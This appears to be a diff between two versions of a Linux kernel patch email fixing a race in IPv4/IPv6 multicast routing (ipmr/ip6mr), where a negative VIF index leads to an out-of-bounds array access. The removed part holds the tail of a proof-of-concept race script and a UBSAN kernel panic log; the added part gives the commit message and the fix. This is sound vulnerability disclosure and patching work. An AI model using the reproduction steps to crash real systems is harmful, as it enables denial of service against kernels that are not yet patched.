-    echo '-:ipmr_find_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
-    echo 'p:ipmr_hold vif_add+0x496' >/sys/kernel/debug/tracing/kprobe_events
-    echo 'p:ipmr_find_hold ip_mr_forward+0x35' >/sys/kernel/debug/tracing/kprobe_events
-    echo 1 >/sys/kernel/debug/tracing/events/kprobes/enable
-
-    make clean >/dev/null 2>&1 || true
-    make
-
-    duration="${1:-300}"
-    taskset -c 1 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.1.log 2>&1 &
-    pid1=$!
-    taskset -c 2 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.2.log 2>&1 &
-    pid2=$!
-    taskset -c 3 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.3.log 2>&1 &
-    pid3=$!
-
-    trap 'kill "$pid1" "$pid2" "$pid3" 2>/dev/null || true; cleanup' EXIT
-    exec ./poc race "$duration"
-
-------END poc.sh--------
-
-----BEGIN crash log----
-
-[   67.164888] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
-[   67.165410] CPU: 1 UID: 0 PID: 1016 Comm: poc Not tainted 6.12.95 #1
-[   67.165883] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[   67.166689] Call Trace:
-[   67.166867]  <IRQ>
-[   67.167077]  panic+0x352/0x3e0
-[   67.167313]  ? _printk+0x64/0x80
-[   67.167614]  check_panic_on_warn+0x44/0x60
-[   67.168007]  __ubsan_handle_out_of_bounds+0xe7/0x100
-[   67.168452]  ipmr_queue_xmit+0x6e1/0x730
-[   67.168907]  ip_mr_input+0xf3/0x460
-[   67.169450]  __netif_receive_skb_one_core+0x89/0xa0
-[   67.170312]  process_backlog+0x99/0x1b0
-[   67.171034]  __napi_poll+0x28/0x1b0
-[   67.171564]  net_rx_action+0x197/0x370
-[   67.172145]  handle_softirqs+0xe6/0x300
-[   67.172723]  do_softirq.part.0+0x3b/0x60
-[   67.173412]  </IRQ>
-[   67.173733]  <TASK>
-[   67.174200]  __local_bh_enable_ip+0x4f/0x60
-[   67.174989]  __dev_queue_xmit+0x372/0xe60
-[   67.175487]  ? ip_generic_getfrag+0x63/0xf0
-[   67.176028]  ? srso_alias_return_thunk+0x5/0xfbef5
-[   67.176746]  ? __ip_append_data+0xc9b/0x13a0
-[   67.177601]  ? __pfx_ip_generic_getfrag+0x10/0x10
-[   67.178369]  ip_finish_output2+0x268/0x540
-[   67.179085]  ip_output+0x5d/0xe0
-[   67.179702]  ? __pfx_ip_finish_output+0x10/0x10
-[   67.180402]  ip_send_skb+0x86/0x90
-[   67.180960]  udp_send_skb+0x18e/0x360
-[   67.181678]  udp_sendmsg+0xb31/0xe40
-[   67.182282]  ? __pfx_ip_generic_getfrag+0x10/0x10
-[   67.182854]  ? ____sys_sendmsg+0x2e8/0x310
-[   67.183361]  ____sys_sendmsg+0x2e8/0x310
-[   67.183856]  ? copy_msghdr_from_user+0x7d/0xc0
-[   67.184574]  ___sys_sendmsg+0x9a/0xe0
-[   67.185177]  ? __schedule+0x47e/0x1450
-[   67.185749]  __sys_sendmmsg+0xfa/0x210
-[   67.186323]  __x64_sys_sendmmsg+0x21/0x30
-[   67.187067]  do_syscall_64+0x58/0x120
-[   67.187630]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
-[   67.188274] RIP: 0033:0x7f22ef597687
-[   67.188698] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
-[   67.191292] RSP: 002b:00007ffc261b1d80 EFLAGS: 00000202 ORIG_RAX: 0000000000000133
-[   67.192314] RAX: ffffffffffffffda RBX: 00007f22ef505740 RCX: 00007f22ef597687
-[   67.193303] RDX: 0000000000000040 RSI: 00007ffc261b2260 RDI: 0000000000000003
-[   67.194295] RBP: 00007ffc261b1de0 R08: 0000000000000000 R09: 0000000000000000
-[   67.195124] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000003
-[   67.195990] R13: 00007ffc261b2260 R14: 0000000000000078 R15: 000057fc757db880
-[   67.197089]  </TASK>
-[   67.198132] Kernel Offset: disabled
-
------END crash log-----
-
-Best regards,
-Zhiling Zou
-
-Zhiling Zou (1):
-  ipmr: validate VIF indexes before offload lookup
-
- net/ipv4/ipmr.c | 9 +++++++--
- 1 file changed, 7 insertions(+), 2 deletions(-)
-
+A packet can race with VIF publication and make ipmr_find_vif() return
+-1 even though the VIF device pointer is already visible. In the IPv4
+path, checking only the MFC parent device then allows forwarding to
+continue with an invalid ingress VIF. Besides the offload lookup, this
+can let (*,G) forwarding loop the packet back out the ingress VIF.
+
+Reject packets whose ingress VIF cannot be found in both IPv4 and IPv6
+forwarding. The IPv4 offload helper also checks for a negative ingress
+index before deriving vif_table pointers. The output index comes from
+the bounded MFC output-interface iteration, so it does not need a
+separate check.
+
+The out-of-bounds read in ipmr_forward_offloaded() requires an skb
+marked for L3 forwarding offload, which is currently done by mlxsw.
+The race is rare; the supplied PoC triggers a UBSAN report for the
+negative array index, but does not demonstrate an actual out-of-bounds
+read.
+
+Fixes: 4eadb88244d1 ("ipmr: do not acquire mrt_lock while calling ip_mr_forward()")
+Fixes: 9b1c21d898fd ("ip6mr: do not acquire mrt_lock while calling ip6_mr_forward()")
+Cc: stable@vger.kernel.org
+Reported-by: Vega <vega@nebusec.ai>
+Link: https://lore.kernel.org/netdev/b966eb102e98f299e45be59ada033a8766e4c6df.1791899747.git.zhilinz@nebusec.ai/
+Suggested-by: Ido Schimmel <idosch@nvidia.com>
+Suggested-by: Naman Gulati <namangulati@google.com>
+Assisted-by: LLM
+Signed-off-by: Zhiling Zou <zhilinz@nebusec.ai>
+---
+changes in v2:
+  - Reject packets with an unknown ingress VIF in IPv4 and IPv6 forwarding.
+  - Keep only the negative in_vifi check in the offload helper; out_vifi is
+    bounded by the MFC output-interface iteration.
+  - Add the Fixes tag for the corresponding IPv6 forwarding change.
+  - Clarify that an actual OOB read requires the mlxsw offload mark and that
+    the PoC reports the UBSAN negative-index diagnostic only.
+  - v1 Link: https://lore.kernel.org/netdev/b966eb102e98f299e45be59ada033a8766e4c6df.1791899747.git.zhilinz@nebusec.ai/
+
+ net/ipv4/ipmr.c  | 11 ++++++++---
+ net/ipv6/ip6mr.c |  3 ++-
+ 2 files changed, 10 insertions(+), 4 deletions(-)
+
+diff --git a/net/ipv4/ipmr.c b/net/ipv4/ipmr.c
+index b9c544d48c452..d10a66534ef9f 100644
+--- a/net/ipv4/ipmr.c
++++ b/net/ipv4/ipmr.c
+@@ -1879,11 +1879,15 @@ static inline int ipmr_forward_finish(struct net *net, struct sock *sk,
+ static bool ipmr_forward_offloaded(struct sk_buff *skb, struct mr_table *mrt,
+ 				   int in_vifi, int out_vifi)
+ {
+-	struct vif_device *out_vif = &mrt->vif_table[out_vifi];
+-	struct vif_device *in_vif = &mrt->vif_table[in_vifi];
++	struct vif_device *out_vif, *in_vif;
+ 
+ 	if (!skb->offload_l3_fwd_mark)
+ 		return false;
++	if (in_vifi < 0)
++		return false;
++
++	out_vif = &mrt->vif_table[out_vifi];
++	in_vif = &mrt->vif_table[in_vifi];
+ 	if (!out_vif->dev_parent_id.id_len || !in_vif->dev_parent_id.id_len)
+ 		return false;
+ 	return netdev_phys_item_id_same(&out_vif->dev_parent_id,
+@@ -2064,7 +2068,8 @@ static void ip_mr_forward(struct net *net, struct mr_table *mrt,
+ 	}
+ 
+ 	/* Wrong interface: drop packet and (maybe) send PIM assert. */
+-	if (rcu_access_pointer(mrt->vif_table[vif].dev) != dev) {
++	if (true_vifi < 0 ||
++	    rcu_access_pointer(mrt->vif_table[vif].dev) != dev) {
+ 		if (rt_is_output_route(skb_rtable(skb))) {
+ 			/* It is our own packet, looped back.
+ 			 * Very complicated situation...
+diff --git a/net/ipv6/ip6mr.c b/net/ipv6/ip6mr.c
+index 9d8116b5edb17..faaf04f5c4f33 100644
+--- a/net/ipv6/ip6mr.c
++++ b/net/ipv6/ip6mr.c
+@@ -2218,7 +2218,8 @@ static void ip6_mr_forward(struct net *net, struct mr_table *mrt,
+ 	/*
+ 	 * Wrong interface: drop packet and (maybe) send PIM assert.
+ 	 */
+-	if (rcu_access_pointer(mrt->vif_table[vif].dev) != dev) {
++	if (true_vifi < 0 ||
++	    rcu_access_pointer(mrt->vif_table[vif].dev) != dev) {
+ 		atomic_long_inc(&c->_c.mfc_un.res.wrong_if);
+ 
+ 		if (true_vifi >= 0 && READ_ONCE(mrt->mroute_do_assert) &&
 -- 
 2.55.0
 
